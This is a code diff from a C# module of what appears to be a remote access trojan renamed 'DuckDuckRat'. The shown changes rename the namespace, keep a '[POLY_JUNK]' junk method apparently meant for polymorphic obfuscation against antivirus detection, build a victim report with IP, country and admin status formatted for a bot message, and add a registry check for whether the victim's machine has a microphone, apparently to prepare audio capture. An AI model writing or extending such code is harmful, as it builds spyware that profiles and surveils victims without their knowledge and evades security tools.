@@ -11,12 +11,12 @@ using System.Text.RegularExpressions;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class SystemInfoModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_54ed8aea() {
+        private static void _DuckDuckRat_54ed8aea() {
             int val = 58601;
             if (val > 50000) Console.WriteLine("Hash:" + 58601);
         }
@@ -46,7 +46,7 @@ namespace FinalBot.Modules
         public static string GetSystemInfo()
         {
             var (ip, country, flag) = GetCountryInfo();
-            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 ЮЗЕР";
+            string adminStatus = DuckDuckRat.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 ЮЗЕР";
 
             var sb = new StringBuilder();
             sb.AppendLine("💎 <b>SYSTEM INFORMATION</b>");
@@ -222,5 +222,19 @@ namespace FinalBot.Modules
             sb.AppendLine("━━━━━━━━━━━━━━━━━━");
             return sb.ToString();
         }
+        public static bool HasMicrophone()
+        {
+            try
+            {
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Capture"))
+                {
+                    if (key != null && key.SubKeyCount > 0) return true;
+                }
+            }
+            catch { }
+            return false;
+        }
     }
 }
+
+
